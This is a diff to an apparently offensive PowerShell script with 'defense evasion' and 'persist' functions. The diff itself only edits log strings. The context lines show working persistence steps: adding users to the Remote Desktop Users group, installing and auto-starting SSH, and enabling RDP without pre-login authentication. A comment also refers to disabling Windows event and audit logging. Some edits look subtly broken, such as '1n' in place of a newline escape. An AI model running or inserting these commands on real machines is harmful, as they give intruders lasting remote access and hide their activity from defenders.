@@ -8,13 +8,13 @@ $arg1=$args[1]
 
 # This string will contain notes of every information performed by the script.
 # The log will only be written to the configs.txt file if the --log flag is set.
-$logString = ""
+$global:logString = ""
 
 
 
 function defenseEvasion {
 
-   $logString = $logString + "---------- DEFENSE EVASTION ----------"
+   $logString = $logString + "---------- DEFENSE EVASTION ----------1n"
 
     #Stop Windows Event logging and audit policy logging. Source https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/impair-defenses/disable-windows-event-logging
     try {
@@ -119,25 +119,25 @@ function persist {
     ## Add both new users to the RDP allowed group
     Add-LocalGroupMember -Group "Remote Desktop Users" -Member $localUserName
     Add-LocalGroupMember -Group "Remote Desktop Users" -Member $adminUserName
-    $logString = $logString +   "Local users added to RDP group:" +  $localUserName + "," +  $adminUserName
+    $logString = $logString +   "Local users added to RDP group:" +  $localUserName + "," +  $adminUserName + "`n"
 
     # Install SSH client on the host
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
     # Enable SSH service + modify the service to start automatically
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'
-   $logString = $logString +  "SSH client installed, enabled to run on startup."
+   $logString = $logString +  "SSH client installed, enabled to run on startup.`n"
 
    #Enable RDP on the system
    # Registry keys taken from this Reddit thread: https://www.reddit.com/r/PowerShell/comments/8qbxn5/enabling_rdp/
     Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 #Value 0 means RDP is enabled
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 #Value 0 means RDP can be opened before authentication
-    $logString = $logString +  "RDP enabled."
+    $logString = $logString +  "RDP enabled.`n"
 }
 
 
 # Main Execution
-$logString = $logString +  ".......... BEGINNING NEW CONFIG ............"
+$logString = $logString +  ".......... BEGINNING NEW CONFIG ............`n"
 
 if ($arg0 -eq "--help") {
     showHelp
